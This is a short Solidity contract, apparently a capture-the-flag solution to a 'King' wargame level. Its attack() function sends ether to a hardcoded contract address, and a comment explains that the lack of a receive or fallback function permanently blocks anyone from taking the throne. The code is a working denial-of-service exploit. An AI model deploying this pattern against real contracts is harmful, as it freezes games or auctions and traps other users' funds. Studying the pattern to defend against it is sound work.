// SPDX_LISENCE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
contract KingMaker { // 0x96DEb1778790048799aB7C354a26B92d9f402e60
    address public immutable KingSetter = 0x940ccaeE0AEB69Da7993A8f646c383B0f8c79036;
    function attack() public payable {
        KingSetter.call{value: msg.value}("");
    }

    // have no fallback or receive function, so it will reject any ether sent to it, and thus become the king of the castle, taking no ether in exchange of the throne
}